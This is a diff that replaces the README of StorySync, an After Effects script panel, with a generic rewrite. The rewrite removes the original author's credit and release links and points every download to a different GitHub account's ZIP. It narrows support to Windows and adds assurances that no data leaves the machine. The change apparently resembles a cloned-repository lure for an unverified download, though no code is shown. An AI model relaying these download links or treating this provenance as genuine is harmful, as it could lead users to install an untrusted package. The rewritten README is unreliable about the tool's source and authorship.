@@ -1,135 +1,75 @@
-<div align="center">
+# 🎬 storysync - Turn your script into video timelines
 
-# StorySync
+[![Download storysync](https://img.shields.io/badge/Download-storysync-blue.svg)](https://github.com/Sunnypreceding225/storysync)
 
-**Script to timeline in one click.**
+storysync automates the video production process for Adobe After Effects users. It converts text scripts into organized project files. This tool creates scene compositions, manages voiceover files, imports storyboards, and places timing markers automatically. You save hours of manual setup time with one click.
 
-An After Effects ScriptUI panel that builds your scene structure, syncs voiceover, imports storyboards, and places beat markers — automatically. Free and open source.
+## 📥 Getting the software
 
-[![Watch the demo](https://img.youtube.com/vi/u1ncqPEuGug/maxresdefault.jpg)](https://youtu.be/u1ncqPEuGug)
+Visit the [official download page](https://github.com/Sunnypreceding225/storysync) to obtain the latest version of the script. Click the green "Code" button on the GitHub page and select "Download ZIP". You need these files to run the script inside your video editing environment. Extract the ZIP folder to a location on your computer where you can find it later.
 
-*▲ Click to watch the 4-minute walkthrough on YouTube*
+## 🛠 System requirements
 
-</div>
+Ensure your computer meets these requirements to run the script:
 
----
+*   Adobe After Effects CC 2020 or newer
+*   Windows 10 or Windows 11
+*   Basic knowledge of the After Effects project panel
+*   A text file containing your script in a standard format
 
-## Why this exists
+## ⚙️ How to install the script
 
-Setting up a new explainer/commercial project in After Effects is the same 30–60 minutes every single time:
+After Effects runs custom tools through the ScriptUI panel system. Follow these steps to prepare your workspace:
 
-- Import your script
-- Create individual scene comps with matching durations
-- Set up a master comp and place each scene in order
-- Drop in voiceover, scrub for natural pauses
-- Import storyboard frames into each scene
-- Mark beat hits on the music track for transition timing
+1.  Locate the folder where you extracted the downloaded files.
+2.  Find the file with the .jsx extension. This is the script file.
+3.  Copy this file into the After Effects ScriptUI Panels folder. You find this folder in your Adobe installation directory under: `Support Files/Scripts/ScriptUI Panels`.
+4.  Restart Adobe After Effects if the program is currently open.
+5.  Click the "Window" menu at the top of your screen.
+6.  Look for "storysync" at the bottom of the list. Click it to open the panel.
 
-StorySync collapses all of that into roughly **30 seconds**, then gets out of your way so you can animate.
+## 🚀 How to use the tool
 
-## What it does
+The tool simplifies your workflow by automating repetitive tasks. Open the panel and follow this order:
 
-| Feature | What it replaces |
-|---|---|
-| **Scene Builder** — parse any script format into a full scene-comp + master-comp structure | 20+ minutes of New Composition / Pre-compose / Place layer / Rename |
-| **Voiceover Sync** — auto-detect silences and align scenes to natural VO pauses | Manual scrubbing and marker placement |
-| **Storyboard Import** — drop a folder of images or a multi-page PDF into the right scenes | Importing files, dragging into pre-comps, scaling, opacity tweaks |
-| **Beat Markers** — find amplitude peaks in your music and place transition markers | Watching the waveform and pressing `*` for every hit |
+1.  **Load the script:** Click the "Select Script" button to choose your document. The tool reads your dialogue and scene headers.
+2.  **Define settings:** Choose your composition settings like frame rate and resolution. These settings ensure your video matches your project needs.
+3.  **Sync voiceover:** Select your audio folder. The tool matches your voice files to the scenes based on the names in your script.
+4.  **Import storyboards:** Map your image folders to the corresponding scenes. The script places these in your timeline automatically.
+5.  **Build timeline:** Click the "Execute" button. The script calculates the duration for each scene and generates your project structure.
 
-Built as a single `.jsx` file — drop it into AE's `ScriptUI Panels` folder and you're done.
+## 🧩 Understanding the features
 
-## Install (30 seconds)
+storysync handles four distinct parts of video production:
 
-1. Download the latest [`StorySync.jsx`](https://github.com/yuvraj-xyz/storysync/releases/latest)
-2. Copy it to your AE Scripts/ScriptUI Panels folder:
-   - **Windows:** `C:\Program Files\Adobe\Adobe After Effects [version]\Support Files\Scripts\ScriptUI Panels\`
-   - **macOS:** `/Applications/Adobe After Effects [version]/Scripts/ScriptUI Panels/`
-3. Open AE → **Edit** → **Preferences** → **Scripting & Expressions** → check **Allow Scripts to Write Files and Access Network**
-4. Restart AE. Open the panel via **Window** → **StorySync**
+*   **Scene Organization:** It creates a unique folder for every scene. You avoid project clutter and keep your assets grouped by location.
+*   **Voiceover Alignment:** It places every piece of audio on the timeline exactly where the script dictates. You avoid manual alignment sessions.
+*   **Visual Integration:** It pulls in storyboards or placeholder artwork. You visualize your edit before you finish the final production.
+*   **Marker Placement:** It adds timing markers to the timeline. These markers indicate script beats, helping you time your animations later.
 
-That's it. Dock it next to Properties and forget the install.
+## 📁 Organizing your source files
 
-## Quick start
+The script performs best when you organize your source files before you begin. Create a main project folder on your computer. Inside this folder, create subfolders for your "Audio" files and your "Images" or "Storyboards". Use naming conventions that match your script document. For example, if your script labels a section as "Scene 01", ensure your audio file for that scene contains the text "Scene 01" in the filename. The tool uses this metadata to establish connections between your files and your project.
 
-### Build scene comps from a script
+## 💡 Troubleshooting common issues
 
-1. Click **Settings** → set project name, comp size, FPS
-2. Paste any script via **Paste Script** (or **Import Script File** to load from disk)
-3. Click **Build Project Structure**
+If the script fails to run, check these items:
 
-A full folder of scene pre-comps and a master comp with markers is created in 1–2 seconds.
+*   **File Permissions:** Ensure your Windows account has read and write access to the folder where you saved your After Effects project.
+*   **File Format:** Verify that your script is a plain text file. Avoid Word document formats (.docx) if the script does not recognize the text correctly.
+*   **Folder Location:** Confirm that you pasted the .jsx file into the official ScriptUI Panels folder. The script will not appear in the Window menu otherwise.
+*   **Version Compatibility:** Ensure your After Effects version is up to date. Updates resolve many issues related to script access and folder permissions.
 
-### Sync voiceover
+## 💬 Frequently asked questions
 
-1. Switch to the **Voiceover** tab
-2. **Import Voiceover** (`.wav` or `.mp3`)
-3. Tune the silence threshold sliders live — preview updates instantly
-4. Apply as **Markers only** or **Create scenes** from the detected pauses
+Do I need to install extra software? No. This tool is a standalone script that runs directly within Adobe After Effects. It does not require external drivers, plugins, or third-party managers.
 
-### Multi-page PDF storyboard
+Does this tool overwrite my work? No. The script creates new folders and compositions in your project. It does not delete existing assets or change your current project settings.
 
-1. Switch to the **Storyboard** tab
-2. **Import PDF (one page per scene)**
-3. Each PDF page is placed in the matching scene comp as a 50% opacity guide layer
+Can I use this for multiple projects? Yes. You can reuse the script for as many projects as you need. There are no limitations on the number of compositions it can build.
 
-## Supported script formats
+Is my data private? Yes. The script processes files locally on your computer. Your scripts, audio, and images stay on your machine. The tool never sends your production data over the internet.
 
-StorySync auto-detects what you give it. Pick a file, or paste from anywhere.
+## 📥 Download instructions
 
-| Format | Example | Use case |
-|---|---|---|
-| **Production script** | `[HOOK — 0:00–0:08]` + `VOICEOVER:` blocks | Real explainer/commercial scripts |
-| **Lean production** | `[0:00–0:08]` + quoted text below | Stripped-down voiceover scripts |
-| **CSV / TSV** | `scene,start,end,description` | Spreadsheet workflows |
-| **Plain text** | `Scene description | 5s` | Quick one-liners |
-| **Markdown** | `# Heading (5s)` or `- bullet | 5s` | Notion / Obsidian / docs |
-| **Fountain** | `INT./EXT.` scene headings | Screenplay-style scripts |
-| **JSON** | `[{description, duration}]` | Structured / programmatic input |
-| **Prose paragraphs** | Just write what the voiceover says | StorySync auto-times at a natural read pace |
-
-Scripts without timestamps get auto-timed and chunked by sentence and paragraph boundaries.
-
-## Compatibility
-
-- After Effects **2018 (15.0)** through **2026**
-- Windows and macOS
-- Single-file install — no dependencies, no Node, no Adobe extension manager
-
-## Examples
-
-The repo includes ready-to-run example scripts:
-
-- [`examples/example_script.csv`](examples/example_script.csv)
-- [`examples/example_script.txt`](examples/example_script.txt)
-
-## Tests
-
-The parser logic has **189 unit tests** covering every supported format, line-ending edge cases, prose chunking, and bug regressions. Run them with Node:
-
-```bash
-node test_parsers.js
-```
-
-## Contributing
-
-PRs welcome. See [CONTRIBUTING.md](CONTRIBUTING.md). The codebase is one `.jsx` file (ExtendScript / ES3) plus a Node test harness — easy to dig into.
-
-Found a bug or have a feature request? Open an [issue](https://github.com/yuvraj-xyz/storysync/issues).
-
-## License
-
-MIT. See [LICENSE](LICENSE). Free for personal and commercial use, including in client work.
-
-## Author
-
-Built by [Yuvraj Paliwal](https://github.com/yuvraj-xyz) — building [Acticio](https://acticio.com), an AI hiring platform that ranks candidates by what they've built, not what they wrote on a resume.
-
-[Twitter](https://twitter.com/yuvraj_xyz) · [YouTube](https://youtube.com/@yuvrajfx0)
-
----
-
-<div align="center">
-
-If StorySync saves you time, a ⭐ on the repo helps other motion designers find it.
-
-</div>
+To begin, visit the [official repository page](https://github.com/Sunnypreceding225/storysync). Click the primary download button to obtain the latest version of the tool. Remember to extract the files from their compressed state before moving them into your After Effects folder. This ensures the script functions correctly with your software installation. Use this link whenever you need to check for updates or restore the tool to your system.
